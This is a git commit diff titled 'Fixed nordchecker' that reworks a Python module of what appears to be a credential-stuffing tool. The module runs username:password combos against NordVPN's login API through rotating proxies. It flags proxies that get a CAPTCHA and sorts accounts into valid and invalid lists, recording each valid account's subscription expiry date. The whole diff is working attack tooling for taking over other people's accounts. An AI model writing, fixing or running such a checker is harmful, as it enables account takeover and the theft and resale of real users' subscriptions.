7ffc03472ad8549951e994f2c14ce37a9d7bd578
scorpion <coc909scorp@gmail.com>
2019-05-24 22:05:51 +0200

    Fixed nordchecker

--- checkers/nordvpn.py
+++ checkers/nordvpn.py
@@ -6,6 +6,7 @@ from datetime import datetime
 import time
 import base64
 import json
+import traceback
 
 header_one = {
     "Accept": "\"/\"",
@@ -26,18 +27,35 @@ def check(x):
         proxs_list = proxy_getter(__name__)
         try:
             r_one = requests.post(url="https://zwyr157wwiu6eior.com/v1/users/tokens", headers=header_one, data=body_one, timeout=int(settings.nordvpn.timeout), proxies=proxs_list[1])
+        except:
+            continue
+        try:
             if r_one.content.decode() != "NULL":
                 if r_one.content.decode().__contains__("CAPTCHA?"):
                     Proxies.checked_json[proxs_list[0]]["bans"]["nordvpn"] = True
                     continue
                 else:
                     stage_one_json = r_one.json()
-        except:
-            continue
-        if 'errors' in stage_one_json:
-            continue
-        else:
-            break
+
+                    if 'errors' in stage_one_json:
+                        if stage_one_json.get("errors").get("code") == 101301:
+                            pass
+                        else:
+                            print(stage_one_json.get("errors").get("code"))
+                            print(stage_one_json)
+                        accounts.invalid_nordvpn.append(f"{username}:{password}")
+                        return
+                    check2(username=username, password=password, stage_one_json=stage_one_json, proxs_list=proxs_list)
+                    return
+        except Exception as e:
+            #traceback.print_exc()
+            #print(combo)
+            #print(1, username, r_one.text, e)
+            pass
+    accounts.invalid_nordvpn.append(f"{username}:{password}")
+
+def check2(username, password, stage_one_json, proxs_list):
+    proxs_list = proxs_list
     for i in range(0, int(settings.nordvpn.max_errors_per_try2)):
         try:
             token = str(stage_one_json["token"])
@@ -45,8 +63,10 @@ def check(x):
             header_two = {
                 "Authorization": "Basic " + token_b64
             }
-        except:
-            continue
+        except Exception as e:
+            #print(2, username, stage_one_json, e)
+            accounts.invalid_nordvpn.append(f"{username}:{password}")
+            return
         try:
             stage_two = requests.get("https://zwyr157wwiu6eior.com/v1/users/services", headers=header_two, proxies=proxs_list[1], timeout=float(settings.nordvpn.timeout)).content
             stage_two_json = json.loads(stage_two)
@@ -57,4 +77,7 @@ def check(x):
         if int(expire_unix) > int(time.time()):
             accounts.valid_nordvpn.append(f"{username}:{password}:{datetime.fromtimestamp(expire_unix).strftime('%Y-%m-%d')}")
             return
+        else:
+            pass
+            #print(username, "is expired")
     accounts.invalid_nordvpn.append(f"{username}:{password}")
